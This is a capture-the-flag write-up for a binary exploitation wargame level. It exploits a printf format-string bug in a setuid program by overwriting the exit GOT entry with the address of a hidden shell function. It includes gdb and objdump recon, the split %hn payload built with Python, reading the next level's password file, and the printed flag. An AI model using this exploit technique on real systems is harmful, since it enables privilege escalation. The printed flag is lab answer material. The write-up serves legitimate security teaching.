# Level 5

Same recon as level0: SUID **level6**.

## Analysis

```c
void o(void) { system("/bin/sh"); _exit(1); }   // backdoor, never called

void n(void) {
    char local_20c[520];
    fgets(local_20c, 0x200, stdin);
    printf(local_20c);               // format string vulnerability
    exit(1);                          // libc call -> goes through the GOT
}
void main(void) { n(); }
```

Same format-string bug as level3/4, but this time there is no magic global to set. Instead there is `o()`, a hidden function that starts a shell, and an `exit(1)` call right after `printf`. `exit` lives in libc, so the program finds its address in the [GOT](../knowledge_base/got_overwrite.md) and jumps there.

> **GOT overwrite.** The GOT is a table that holds the real address of each libc function the program calls. There is no RELRO here, so the table is writable. If we change the `exit` entry to point at `o`, the `exit(1)` call runs `o` instead.

## Exploit

### The two addresses

`o` from `info functions`:

```
(gdb) info functions
0x080484a4  o
```

`exit@GOT` from the PLT stub, confirmed with objdump:

```
(gdb) x/i 0x80483d0
0x80483d0 <exit@plt>:  jmp *0x8049838      <- exit@GOT
$ objdump -R level5 | grep ' exit'
08049838 R_386_JUMP_SLOT   exit
```

### Where our input lands

```
$ ./level5
AAAA %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141
```

`41414141` is the 4th word → input at **position 4**.

### Split write (as in level4)

Write `0x080484a4` into `0x08049838` as two `%hn` halves:

| Half | Value | Decimal | Target |
|---|---|---|---|
| high | `0x0804` | 2052 | `0x0804983a` (exit@GOT+2) |
| low | `0x84a4` | 33956 | `0x08049838` (exit@GOT) |

Addresses at positions 4 and 5 → 8 bytes printed. Pads: `2052 - 8 = 2044`, then `33956 - 2052 = 31904`.

### Run

```bash
python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044x%4$hn" + "%31904x%5$hn"' > /tmp/payload5
(cat /tmp/payload5; cat) | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

(`\x3a\x98\x04\x08` = exit@GOT+2, `\x38\x98\x04\x08` = exit@GOT, little-endian. `; cat` keeps stdin open for the shell from `o`.)

Flag: `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
